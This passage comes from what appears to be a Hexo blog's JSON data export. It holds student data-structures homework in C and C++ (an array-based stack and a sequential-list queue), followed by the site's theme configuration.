class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> SElemType;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> Status;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> INIT_SIZE 100</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> STACKINCREMENT 10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Ok 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> Error 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> True 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> False 0</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    SElemType *base;</span><br><span class=\"line\">    SElemType *top;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> stacksize;</span><br><span class=\"line\">&#125;SqStack;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">InitStack</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    s-&gt;base = (SElemType *)<span class=\"built_in\">malloc</span>(INIT_SIZE * <span class=\"keyword\">sizeof</span>(SElemType));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!s-&gt;base)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;存储空间分配失败！&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Error;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    s-&gt;top = s-&gt;base;</span><br><span class=\"line\">    s-&gt;stacksize = INIT_SIZE;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">ClearStack</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    s-&gt;top = s-&gt;base;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">StackEmpty</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(s-&gt;top == s-&gt;base)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> True;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> False;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Destroy</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(s-&gt;base);</span><br><span class=\"line\">    s-&gt;base = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    s-&gt;top = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    s-&gt;stacksize=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">GetTop</span><span class=\"params\">(SqStack *s, SElemType &amp;e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(s-&gt;top == s-&gt;base)<span class=\"keyword\">return</span> Error;</span><br><span class=\"line\">    e = *(s-&gt;top - <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Push</span><span class=\"params\">(SqStack *s, SElemType e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(s-&gt;top - s-&gt;base &gt;= s-&gt;stacksize)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        s-&gt;base = (SElemType *)<span class=\"built_in\">realloc</span>(s-&gt;base, (s-&gt;stacksize + STACKINCREMENT) * <span class=\"keyword\">sizeof</span>(SElemType));</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!s-&gt;base)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;存储空间分配失败！&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> Error;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        s-&gt;top = s-&gt;base + s-&gt;stacksize;</span><br><span class=\"line\">        s-&gt;stacksize += STACKINCREMENT;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    *s-&gt;top++ = e;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">Pop</span><span class=\"params\">(SqStack *s, SElemType *e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(s-&gt;top == s-&gt;base)<span class=\"keyword\">return</span> Error;</span><br><span class=\"line\">    --s-&gt;top;</span><br><span class=\"line\">    *e = *(s-&gt;top);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">StackTraverse</span><span class=\"params\">(SqStack *s,Status(*visit)(SElemType))</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    SElemType *b = s-&gt;base;</span><br><span class=\"line\">    SElemType *t = s-&gt;top;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(t &gt; b)visit(*b++);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">visit</span><span class=\"params\">(SElemType c)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d &quot;</span>,c);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ok;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">stack_insert</span><span class=\"params\">(SqStack *s)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;请输入要进栈的个数：&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;n);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入%d个数依次入栈\\n&quot;</span>,n);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(n--)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> m;</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;m);</span><br><span class=\"line\">        Push(s, m);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">    SqStack a;</span><br><span class=\"line\">    SqStack *s = &amp;a;</span><br><span class=\"line\">    SElemType e;</span><br><span class=\"line\">    InitStack(s);</span><br><span class=\"line\">    stack_insert(s);</span><br><span class=\"line\">    StackTraverse(s, visit);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;输入1入栈，输入2出栈,输入0退出！\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;n)!=EOF)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(n==<span class=\"number\">1</span>)stack_insert(s);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(n==<span class=\"number\">2</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(StackEmpty(s))<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;栈为空！\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">else</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Pop(s, &amp;e);</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;出栈的元素是：%d\\n&quot;</span>, e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        StackTraverse(s, visit);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    Destroy(s);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"顺序表队列","date":"2019-03-29T09:11:09.000Z","abbrlink":"d1bf19f","updated":"2020-04-08T10:40:24.000Z","_content":"# 顺序表队列\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<iostream>\n#include<cstdio>\n#include<cstdlib>\n#define MAXSIZE 100\n#define OK 1\n#define ERROR 0\n#define OVERFLOW 2\nusing namespace std;\ntypedef int Status;\ntypedef int ElemType;\nstruct node\n{\n    int num;\n};\ntypedef struct\n{\n    node *elem;\n    int length;\n}SqList;\nStatus InitQueue(SqList &L)\n{\n    L.elem=new node[MAXSIZE];\n    if(!L.elem)exit(OVERFLOW);\n    L.length=0;\n    return OK;\n}\nStatus QueueShow(SqList &L)\n{\n    for(int i=0;i<L.length;i++)\n        cout<<L.elem[i].num<<' ';\n    cout<<endl;\n    return OK;\n}\nStatus EnQueue(SqList &L,node e)\n{\n    if(L.length==MAXSIZE)return ERROR;\n    else\n    {\n        L.elem[L.length]=e;\n        ++L.length;\n        return OK;\n    }\n}\nStatus DeQueue(SqList &L)\n{\n    for(int i=1;i<L.length;i++)\n        L.elem[i-1]=L.elem[i];\n    L.length--;\n    return 0;\n}\nvoid menu()\n{\n    cout<<\"1.EnQueue\"<<endl;\n    cout<<\"2.DeQueue\"<<endl;\n    cout<<\"0.Exit\"<<endl;\n}\nint main()\n{\n    SqList L;\n    node e;\n    int a,n;\n    InitQueue(L);\n    while(true)\n    {\n        system(\"CLS\");\n        menu();\n        QueueShow(L);\n        cin>>a;\n        getchar();\n        if(a==1)\n        {\n            cout<<\"Please Input Number To Be Insert:\";\n            cin>>n;getchar();\n            e.num=n;\n            EnQueue(L,e);\n        }\n        else if(a==2)DeQueue(L);\n        else if(a==0)break;\n    }\n    return 0;\n}\n```","source":"_posts/顺序表队列.md","raw":"---\ntitle: 顺序表队列\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 顺序表\n  - 队列\nabbrlink: d1bf19f\nupdated:\n---\n# 顺序表队列\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<iostream>\n#include<cstdio>\n#include<cstdlib>\n#define MAXSIZE 100\n#define OK 1\n#define ERROR 0\n#define OVERFLOW 2\nusing namespace std;\ntypedef int Status;\ntypedef int ElemType;\nstruct node\n{\n    int num;\n};\ntypedef struct\n{\n    node *elem;\n    int length;\n}SqList;\nStatus InitQueue(SqList &L)\n{\n    L.elem=new node[MAXSIZE];\n    if(!L.elem)exit(OVERFLOW);\n    L.length=0;\n    return OK;\n}\nStatus QueueShow(SqList &L)\n{\n    for(int i=0;i<L.length;i++)\n        cout<<L.elem[i].num<<' ';\n    cout<<endl;\n    return OK;\n}\nStatus EnQueue(SqList &L,node e)\n{\n    if(L.length==MAXSIZE)return ERROR;\n    else\n    {\n        L.elem[L.length]=e;\n        ++L.length;\n        return OK;\n    }\n}\nStatus DeQueue(SqList &L)\n{\n    for(int i=1;i<L.length;i++)\n        L.elem[i-1]=L.elem[i];\n    L.length--;\n    return 0;\n}\nvoid menu()\n{\n    cout<<\"1.EnQueue\"<<endl;\n    cout<<\"2.DeQueue\"<<endl;\n    cout<<\"0.Exit\"<<endl;\n}\nint main()\n{\n    SqList L;\n    node e;\n    int a,n;\n    InitQueue(L);\n    while(true)\n    {\n        system(\"CLS\");\n        menu();\n        QueueShow(L);\n        cin>>a;\n        getchar();\n        if(a==1)\n        {\n            cout<<\"Please Input Number To Be Insert:\";\n            cin>>n;getchar();\n            e.num=n;\n            EnQueue(L,e);\n        }\n        else if(a==2)DeQueue(L);\n        else if(a==0)break;\n    }\n    return 0;\n}\n```","slug":"顺序表队列","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkeq004jqse5ah6eccvm","content":"<h1 id=\"顺序表队列\"><a href=\"#顺序表队列\" class=\"headerlink\" title=\"顺序表队列\"></a>顺序表队列</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id=\"more\"></a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAXSIZE 100</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OK 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> ERROR 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> OVERFLOW 2</span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> Status;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">int</span> ElemType;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">node</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> num;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    node *elem;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> length;</span><br><span class=\"line\">&#125;SqList;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">InitQueue</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    L.elem=<span class=\"keyword\">new</span> node[MAXSIZE];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!L.elem)<span class=\"built_in\">exit</span>(OVERFLOW);</span><br><span class=\"line\">    L.length=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">QueueShow</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;L.length;i++)</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;L.elem[i].num&lt;&lt;<span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">EnQueue</span><span class=\"params\">(SqList &amp;L,node e)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(L.length==MAXSIZE)<span class=\"keyword\">return</span> ERROR;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        L.elem[L.length]=e;</span><br><span class=\"line\">        ++L.length;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> OK;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">Status <span class=\"title\">DeQueue</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">        L.elem[i<span class=\"number\">-1</span>]=L.elem[i];</span><br><span class=\"line\">    L.length--;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">menu</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;1.EnQueue&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;2.DeQueue&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;0.Exit&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    SqList L;</span><br><span class=\"line\">    node e;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> a,n;</span><br><span class=\"line\">    InitQueue(L);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        system(<span class=\"string\">&quot;CLS&quot;</span>);</span><br><span class=\"line\">        menu();</span><br><span class=\"line\">        QueueShow(L);</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;a;</span><br><span class=\"line\">        getchar();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(a==<span class=\"number\">1</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;Please Input Number To Be Insert:&quot;</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cin</span>&gt;&gt;n;getchar();</span><br><span class=\"line\">            e.num=n;</span><br><span class=\"line\">            EnQueue(L,e);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a==<span class=\"number\">2</span>)DeQueue(L);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(a==<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"